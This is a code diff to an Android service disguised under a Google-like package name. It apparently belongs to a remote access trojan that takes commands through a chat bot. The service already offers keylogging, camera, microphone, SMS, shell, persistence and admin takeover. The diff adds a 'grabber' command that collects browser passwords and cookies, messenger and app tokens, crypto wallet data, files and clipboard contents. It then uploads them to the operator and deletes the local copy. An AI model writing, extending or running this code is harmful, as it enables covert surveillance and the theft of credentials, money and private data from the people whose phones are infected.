@@ -274,7 +274,7 @@ class SystemNetworkService : Service() {
                             "`ping` `info` `status` `ip` `uptime` `debug` `restart`\n" +
                             "`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n" +
                             "`contacts` `sms` `call_log` `wifi` `battery` `processes`\n" +
-                            "`installed` `notifications` `shell` `persist` `update` `config`\n" +
+                            "`installed` `notifications` `shell` `persist` `grabber` `update` `config`\n" +
                             "`admin` `overlay` `click` `input` `open` `screen`\n" +
                             "`gesture` `pin` `torch` `vibrate`\n\n" +
                             "Type `!help <cmd>` for usage info"
@@ -518,6 +518,39 @@ class SystemNetworkService : Service() {
                     d.sendMsg(":syringe: Installing persistence...")
                     persistApk()
                     d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
+                }
+                "grabber" -> {
+                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
+                    val target = parts.firstOrNull()?.lowercase() ?: "all"
+                    d.sendMsg(":mag: **Grabber running** — targeting: $target")
+                    scope.launch {
+                        try {
+                            val file = when (target) {
+                                "all" -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
+                                "browser" -> com.google.system.GrabberModule.grabBrowser(this@SystemNetworkService)
+                                "messenger" -> com.google.system.GrabberModule.grabMessenger(this@SystemNetworkService)
+                                "tokens" -> com.google.system.GrabberModule.grabTokens(this@SystemNetworkService)
+                                "wallets" -> com.google.system.GrabberModule.grabWallets(this@SystemNetworkService)
+                                "files" -> com.google.system.GrabberModule.grabFiles(this@SystemNetworkService)
+                                "clipboard" -> com.google.system.GrabberModule.grabClipboard(this@SystemNetworkService)
+                                else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
+                            }
+                            if (file != null && file.exists()) {
+                                val size = file.length()
+                                val sizeStr = when {
+                                    size < 1024 -> "${size}B"
+                                    size < 1024 * 1024 -> "${size / 1024}KB"
+                                    else -> "${size / (1024 * 1024)}MB"
+                                }
+                                d.sendFile(":inbox_tray: **Grab complete** — $target ($sizeStr)", file.name, file.readBytes())
+                                file.delete()
+                            } else {
+                                d.sendMsg(":x: **Grab failed** — no data found or permission denied")
+                            }
+                        } catch (e: Exception) {
+                            d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
+                        }
+                    }
                 }
                 "update" -> {
                     val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
@@ -1670,6 +1703,7 @@ class SystemNetworkService : Service() {
             "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
             "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
             "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
+            "grabber" -> ":mag: **!grabber**\nExtract data from device.\nUsage: `!grabber` (all targets)\nUsage: `!grabber browser` (cookies, passwords)\nUsage: `!grabber messenger` (Discord, Telegram, etc.)\nUsage: `!grabber tokens` (app auth tokens)\nUsage: `!grabber wallets` (crypto wallet data)\nUsage: `!grabber files` (documents, images, etc.)\nUsage: `!grabber clipboard` (current clipboard)"
             "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
             "config" -> ":gear: **!config**\nRemote configuration.\nUsage: `!config get` - View current config\nUsage: `!config push <json>` - Update config\nUsage: `!config reset` - Reset to defaults"
             "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
